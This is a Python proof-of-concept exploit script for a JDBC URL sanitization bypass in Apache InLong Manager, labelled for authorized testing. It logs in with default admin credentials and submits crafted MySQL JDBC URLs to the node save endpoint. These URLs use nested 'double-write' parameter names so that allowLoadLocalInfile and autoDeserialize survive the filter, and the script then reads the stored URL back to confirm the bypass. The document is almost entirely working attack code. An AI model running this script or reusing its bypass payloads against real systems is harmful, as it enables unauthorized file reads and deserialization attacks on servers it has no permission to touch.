#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache InLong Manager — JDBC URL Sanitization Bypass (Node Endpoint)
# CVE            : CVE-2025-27531
# Vendor         : Apache Software Foundation
# Product        : Apache InLong Manager
# Affected       : 1.13.0 <= version < 2.1.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-27531 — Vector 2: Node Save Endpoint Bypass

Alternative attack path via POST /api/node/save — does NOT require
pre-existing InLong groups or streams.

ATTACK CHAIN:
  1. Authenticate as admin/inlong
  2. POST /api/node/save with double-write JDBC URL payload
  3. Verify dangerous parameters survive in stored node URL

PREREQUISITES:
  - Python 3 (stdlib only)

REFERENCES:
  - CVE-2025-27531
  - https://github.com/advisories/GHSA-62gc-8jr5-x9pm
"""

import sys
import json
import http.client
import time
import re


# =============================================================================
# Configuration
# =============================================================================

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8083
CONTEXT_PATH = "/inlong/manager"

USERNAME = "admin"
PASSWORD = "inlong"


class InLongNodeExploit:
    """CVE-2025-27531 PoC via /api/node/save endpoint."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.base_url = f"{CONTEXT_PATH}/api"
        self.session_cookie = None

    def _request(self, method, path, body=None):
        """Make an HTTP request to the InLong Manager API."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        headers = {"Content-Type": "application/json"}
        if self.session_cookie:
            headers["Cookie"] = self.session_cookie

        url = f"{self.base_url}{path}"
        json_body = json.dumps(body) if body else None

        try:
            conn.request(method, url, body=json_body, headers=headers)
            response = conn.getresponse()

            cookie_header = response.getheader("Set-Cookie")
            if cookie_header and "JSESSIONID=" in cookie_header:
                match = re.search(r'JSESSIONID=([^;]+)', cookie_header)
                if match:
                    self.session_cookie = f"JSESSIONID={match.group(1)}"

            data = response.read().decode("utf-8")
            if data:
                return json.loads(data)
            return None
        except Exception as e:
            print(f"  [!] Request failed: {e}")
            return None
        finally:
            conn.close()

    def authenticate(self):
        """Authenticate with InLong Manager."""
        print("[*] Step 1: Authenticating...")
        result = self._request("POST", "/anno/login", {
            "username": USERNAME,
            "password": PASSWORD,
        })
        if result and result.get("success"):
            print(f"    [+] Authentication successful! Session: {self.session_cookie}")
            return True
        print(f"    [-] Authentication failed: {result}")
        return False

    def create_node_with_bypass(self, node_name, crafted_url):
        """Create a MySQL data node with a crafted JDBC URL.

        The /api/node/save endpoint calls MySQLDataNodeDTO.convertToJdbcurl()
        which constructs a JDBC URL from host/port/url fields and then calls
        filterSensitive(). We supply the full crafted URL directly.

        Note: The node save endpoint takes `url` (the JDBC URL suffix) rather
        than a full jdbcUrl. But we can also provide host/port directly and
        embed the bypass in the connection properties.
        """
        print(f"\n[*] Creating MySQL data node '{node_name}'...")
        print(f"    Crafted URL: {crafted_url}")

        result = self._request("POST", "/node/save", {
            "type": "MYSQL",
            "name": node_name,
            "url": crafted_url,
            "username": "root",
            "password": "test",
            "inCharges": "admin",
        })

        if result and result.get("success"):
            node_id = result.get("data")
            print(f"    [+] Node created (id: {node_id})")
            return node_id
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            print(f"    [-] Node creation failed: {err}")
            return None

    def get_node(self, node_id):
        """Retrieve a stored node and inspect its JDBC URL."""
        print(f"\n[*] Retrieving stored node (id: {node_id})...")

        result = self._request("GET", f"/node/get/{node_id}")

        if result and result.get("success"):
            node_data = result.get("data", {})
            stored_url = node_data.get("url", "")
            print(f"    Stored URL: {stored_url}")
            # Also check the full node data for any jdbcUrl field
            ext_params = node_data.get("extParams", "")
            if ext_params:
                try:
                    ext = json.loads(ext_params) if isinstance(ext_params, str) else ext_params
                    jdbc_url = ext.get("jdbcUrl", "")
                    if jdbc_url:
                        print(f"    Stored jdbcUrl (extParams): {jdbc_url}")
                        return jdbc_url
                except (json.JSONDecodeError, AttributeError):
                    pass
            return stored_url
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            print(f"    [-] Failed to retrieve node: {err}")
            return None

    def list_nodes(self):
        """List all nodes to find our created ones."""
        result = self._request("POST", "/node/list", {
            "pageNum": 1,
            "pageSize": 100,
        })
        if result and result.get("success"):
            return result.get("data", {}).get("list", [])
        return []


def exploit(target_host, target_port):
    """Run the CVE-2025-27531 exploit via /api/node/save endpoint."""

    print("=" * 72)
    print("CVE-2025-27531 Vector 2: Node Save Endpoint Bypass")
    print("Entry: POST /api/node/save -> MySQLDataNodeDTO -> filterSensitive()")
    print("=" * 72)
    print(f"\nTarget: http://{target_host}:{target_port}{CONTEXT_PATH}")
    print()

    client = InLongNodeExploit(target_host, target_port)

    # Step 1: Authenticate
    if not client.authenticate():
        print("\n[!] FAILED: Could not authenticate. Aborting.")
        sys.exit(1)

    timestamp = int(time.time())
    results = {}

    # Test 1: Double-write with address-list format
    # MySQLDataNodeDTO.convertToJdbcurl() takes the `url` field and prepends
    # "jdbc:mysql://" if not already present. We provide the full bypass URL.
    test_cases = [
        {
            "name": "address_format_allowLoadLocalInfile",
            "url": "address=(host=127.0.0.1)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test",
            "expected": "allowLoadLocalInfile=true",
            "description": "Double-write bypass using address-list format (no ? query string)",
        },
        {
            "name": "address_format_autoDeserialize",
            "url": "address=(host=127.0.0.1)(port=3306)(autoDeautoDeserialize=trueserialize=true)/test",
            "expected": "autoDeserialize=true",
            "description": "autoDeserialize bypass using address-list format via node endpoint",
        },
        {
            "name": "query_string_allowLoadLocalInfile",
            "url": "127.0.0.1:3306/test?allowLoadallowLoadLocalInfile=trueLocalInfile=true",
            "expected": "allowLoadLocalInfile=true",
            "description": "Double-write bypass using standard query-string format via node endpoint",
        },
    ]

    for tc in test_cases:
        print("\n" + "-" * 72)
        print(f"Test: {tc['description']}")
        print("-" * 72)

        node_name = f"poc_{tc['name']}_{timestamp}"
        node_id = client.create_node_with_bypass(node_name, tc["url"])

        if node_id:
            stored_url = client.get_node(node_id)
            if stored_url and tc["expected"] in stored_url:
                print(f"    [+] BYPASS CONFIRMED via node endpoint! '{tc['expected']}' survived!")
                results[tc["name"]] = True
            else:
                print(f"    [-] Bypass NOT detected (stored: {stored_url})")
                results[tc["name"]] = False
        else:
            results[tc["name"]] = False

    # Summary
    print("\n" + "=" * 72)
    print("RESULTS SUMMARY - Node Save Endpoint")
    print("=" * 72)
    for name, success in results.items():
        icon = "[+]" if success else "[-]"
        status = "BYPASSED" if success else "FAILED"
        print(f"  {icon} {name}: {status}")

    any_passed = any(results.values())
    if any_passed:
        print("\n[+] CVE-2025-27531 CONFIRMED via /api/node/save endpoint!")
        print("[+] The node save endpoint is an alternative attack vector.")
    else:
        print("\n[-] Node save endpoint tests did not confirm bypass.")
        print("[*] Note: The node endpoint constructs URLs differently; see poc.py for confirmed bypass.")

    return any_passed


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
